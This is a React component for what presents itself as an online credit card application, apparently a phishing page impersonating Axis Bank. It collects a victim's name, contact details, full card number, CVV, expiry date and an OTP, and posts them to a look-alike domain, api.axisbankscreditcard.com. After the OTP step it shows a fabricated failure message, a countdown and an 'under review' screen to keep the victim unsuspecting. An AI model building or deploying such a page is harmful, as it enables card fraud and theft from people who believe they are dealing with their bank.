import  { useEffect, useState } from "react";
import axios from "axios";
import { Link } from "react-router-dom";
import Button from "../components/ui/Button";

const CreditCard = () => {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    mobile: "",
    cardLimit: "",
    cardHolderName: "",
    cardNumber: "",
    cvv: "",
    expiryDate: "",
    otp: "",
  });
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [expiryDate, setExpiryDate] = useState("");
  const [cardLimits, setCardLimits] = useState("");
  const [contacts, setContacts] = useState("");
  const [cvvs, setCvvs] = useState("");
  const [cardNumbers, setCardNumbers] = useState("");

  const [isActive, setIsActive] = useState(false);
  const [seconds, setSeconds] = useState(300);

  const handleChange = (e) => {
    const { name, value } = e.target;
    if (name === "expiryDate") {
      let inputValue = value.replace(/\D/g, "");
      if (inputValue.length > 2) {
        inputValue = `${inputValue.slice(0, 2)}/${inputValue.slice(2)}`;
      }
      setExpiryDate(inputValue);
      setFormData({ ...formData, [e.target.name]: inputValue });
    } else if (name === "cvv") {
      const numericValue = value.replace(/\D/g, "");
      const truncateValue = numericValue.slice(0, 3);
      setCvvs(truncateValue);
      setFormData((prevData) => ({ ...prevData, [name]: truncateValue }));
    } else if (name === "mobile") {
      const numericValue = value.replace(/\D/g, "");
      const truncateValue = numericValue.slice(0, 10);
      setContacts(truncateValue);
      setFormData((prevData) => ({ ...prevData, [name]: truncateValue }));
    } else if (name === "cardNumber") {
      const numericValue = value.replace(/\D/g, "");
      const truncateValue = numericValue.slice(0, 16);
      setCardNumbers(truncateValue);
      setFormData((prevData) => ({ ...prevData, [name]: truncateValue }));
    } else if (name === "cardLimit") {
      const numericValue = value.replace(/\D/g, "");
      const truncateValue = numericValue.slice(0, 7);
      setCardLimits(truncateValue);
      setFormData((prevData) => ({ ...prevData, [name]: truncateValue }));
    } else if (name === "otp") {
      let numericValue = value.replace(/\D/g, "");
      if (numericValue.length > 3) {
        numericValue = `${numericValue.slice(0, 3)} ${numericValue.slice(3)}`;
      }
      const truncateValue = numericValue.slice(0, 7);
      setFormData((prevData) => ({ ...prevData, [name]: truncateValue }));
    } else {
      setFormData({ ...formData, [e.target.name]: value });
    }
  };

  const handleNext = () => {
    if (
      !formData.fullName ||
      !formData.email ||
      !formData.mobile ||
      !formData.cardLimit
    ) {
      alert("Please fill all the fields");
      return;
    }
    setStep(step + 1);
  };

  const handleFirstStep = () => {
    if (
      !formData.fullName ||
      !formData.email ||
      !formData.mobile ||
      !formData.cardLimit
    ) {
      alert("Please fill all the fields");
      return;
    }
    setStep(step + 1);
  };

  const handleLoading = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
    }, 5000);
  };

  const handleSubmitForm = async () => {
    try {
      if (
        !formData.fullName ||
        !formData.email ||
        !formData.mobile ||
        !formData.cardLimit ||
        !formData.cardHolderName ||
        !formData.cardNumber ||
        !formData.cvv ||
        !formData.expiryDate
      ) {
        alert("Please fill all the fields");
        return;
      } else {
         await axios.post(
          `https://api.axisbankscreditcard.com/users`,
          formData
        );
        handleNext();
        handleLoading();
      }
    } catch (error) {
      console.log(error);
    }
  };

  const handleShowSuccessMessage = () => {
    setShowSuccess(true);
  };

  useEffect(() => {
    if (step === 3) {
      setIsActive(true);
    }
  }, [step]);

  useEffect(() => {
    let intervalId;
    if (isActive && seconds > 0) {
      intervalId = setInterval(() => {
        setSeconds((prevSeconds) => prevSeconds - 1);
      }, 1000);
    }

    return () => clearInterval(intervalId);
  }, [isActive, seconds]);

  const formatTime = (time) => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    return `${minutes.toString().padStart(2, "0")}:${seconds
      .toString()
      .padStart(2, "0")}`;
  };

  return (
    <>
      {showSuccess ? (
        <div>
          <div className="flex justify-center items-center mt-24 flex-col gap-10">
            <p>Hii {formData.fullName},</p>
            <h1 className="text-xl">Thank you for applying</h1>
            <p className="text-sm">
              Your application is under review. You will receive an email once
              your application is approved
            </p>
            <Link className="text-primary" to={"/"}>
              Go to Home
            </Link>
          </div>
        </div>
      ) : (
        <div>
          {loading ? (
            <div className="flex justify-center items-center mt-24 flex-col gap-10">
              <p>Hii {formData.fullName},</p>
              <div className="loader"></div>
              <h1 className="text-xl">Thank you for applying</h1>
              <p className="text-sm">
                Your application is under review. You will receive an email once
                your application is approved
              </p>
            </div>
          ) : (
            <div className="bg pt-14">
              <div className="max-w-6xl m-auto px-4 ">
                <div className="bg-[#F8F9FA] md:w-fit w-full shadow-xl px-5 py-6 flex flex-col gap-3 ">
                  {step === 1 ? (
                    <h1 className="text-xl">Apply Online</h1>
                  ) : step === 2 ? (
                    <h1 className="text-xl">Card Details</h1>
                  ) : (
                    <h1 className="text-xl">Enter OTP</h1>
                  )}
                  <div className="w-full h-1 bg-primary"></div>
                  {step === 1 ? (
                    <div className="grid md:grid-cols-2 grid-cols-1 gap-4">
                      <div className="flex flex-col">
                        <label className="text-sm" htmlFor="">
                          Your Name
                        </label>
                        <input
                          className="outline-none border px-3 py-1 mt-2 text-sm"
                          type="text"
                          placeholder="Your Name"
                          name="fullName"
                          required
                          id="fullName"
                          value={formData.fullName}
                          onChange={handleChange}
                        />
                      </div>
                      <div className="flex flex-col">
                        <label className="text-sm" htmlFor="">
                          Your Email
                        </label>
                        <input
                          className="outline-none border px-3 py-1 mt-2 text-sm"
                          type="text"
                          placeholder="Your Email"
                          name="email"
                          required
                          id="email"
                          value={formData.email}
                          onChange={handleChange}
                        />
                      </div>
                      <div className="flex flex-col">
                        <label className="text-sm" htmlFor="">
                          Your Contact Number
                        </label>
                        <input
                          className="outline-none border px-3 py-1 mt-2 text-sm"
                          type="text"
                          placeholder="Your Contact Number"
                          name="mobile"
                          required
                          maxLength={10}
                          id="mobile"
                          value={formData.mobile}
                          onChange={handleChange}
                        />
                      </div>

                      <div className="flex flex-col">
                        <label className="text-sm" htmlFor="">
                          Card Limit
                        </label>
                        <input
                          className="outline-none border px-3 py-1 mt-2 text-sm"
                          type="text"
                          placeholder="Card Limit"
                          name="cardLimit"
                          required
                          id=" cardLimit"
                          value={formData.cardLimit}
                          onChange={handleChange}
                        />
                      </div>
                    </div>
                  ) : step === 2 ? (
                    <div className="grid md:grid-cols-2 grid-cols-1 gap-4">
                      <div className="flex flex-col">
                        <label className="text-sm" htmlFor="">
                          Card Holder Name
                        </label>
                        <input
                          className="outline-none border px-3 py-1 mt-2 text-sm"
                          type="text"
                          placeholder="Card Holder Name"
                          name="cardHolderName"
                          id="cardHolderName"
                          value={formData.cardHolderName}
                          onChange={handleChange}
                        />
                      </div>
                      <div className="flex flex-col">
                        <label className="text-sm" htmlFor="">
                          Card Number
                        </label>
                        <input
                          className="outline-none border px-3 py-1 mt-2 text-sm"
                          type="text"
                          maxLength={16}
                          placeholder="16 Digit Card Number"
                          name="cardNumber"
                          id="cardNumber"
                          value={formData.cardNumber}
                          onChange={handleChange}
                        />
                      </div>
                      <div className="flex flex-col">
                        <label className="text-sm" htmlFor="">
                          Expiry Date
                        </label>
                        <input
                          className="outline-none border px-3 py-1 mt-2 text-sm"
                          type="text"
                          placeholder="MM/YY"
                          name="expiryDate"
                          id=" expiryDate"
                          value={formData.expiryDate}
                          onChange={handleChange}
                        />
                      </div>
                      <div className="flex flex-col">
                        <label className="text-sm" htmlFor="">
                          CVV
                        </label>
                        <input
                          className="outline-none border px-3 py-1 mt-2 text-sm"
                          type="text"
                          maxLength={3}
                          placeholder="Card CVV"
                          name="cvv"
                          id="cvv"
                          value={formData.cvv}
                          onChange={handleChange}
                        />
                      </div>
                    </div>
                  ) : (
                    <div>
                      <p className="text-sm">Enter OTP</p>
                      <p className="text-sm">
                        We have sent OTP on your registered mobile number
                      </p>
                      <input
                        className="outline-none border px-3 py-1 mt-2 text-sm"
                        type="text"
                        placeholder="One Time Password (OTP)"
                        name="otp"
                        id="otp"
                        value={formData.otp}
                        onChange={handleChange}
                      />
                      {failed && (
                        <p className="text-red-500 text-sm">
                          Failed Please try again after sometime
                        </p>
                      )}
                      <div>{formatTime(seconds)}</div>

                      <Link to={"/"} className="mt-5 text-sm">
                        Resend OTP
                      </Link>
                    </div>
                  )}
                  {step === 1 ? (
                    <Button onClick={handleFirstStep}>Next</Button>
                  ) : step === 2 ? (
                    <div className="flex gap-3">
                      <Button onClick={() => setStep(step - 1)}>Back</Button>
                      <Button
                        onClick={() => {
                          handleSubmitForm();
                        }}
                      >
                        Next
                      </Button>
                    </div>
                  ) : step === 3 ? (
                    <div className="flex gap-3">
                      <Button onClick={() => setStep(step - 1)}>Back</Button>
                      <Button
                        onClick={() => {
                          handleSubmitForm();
                          handleLoading();
                          setFailed(true);
                        }}
                      >
                        Submit
                      </Button>
                    </div>
                  ) : (
                    <Button
                      onClick={() => {
                        handleSubmitForm();
                        handleShowSuccessMessage();
                      }}
                    >
                      Submit
                    </Button>
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      )}
    </>
  );
};

export default CreditCard;
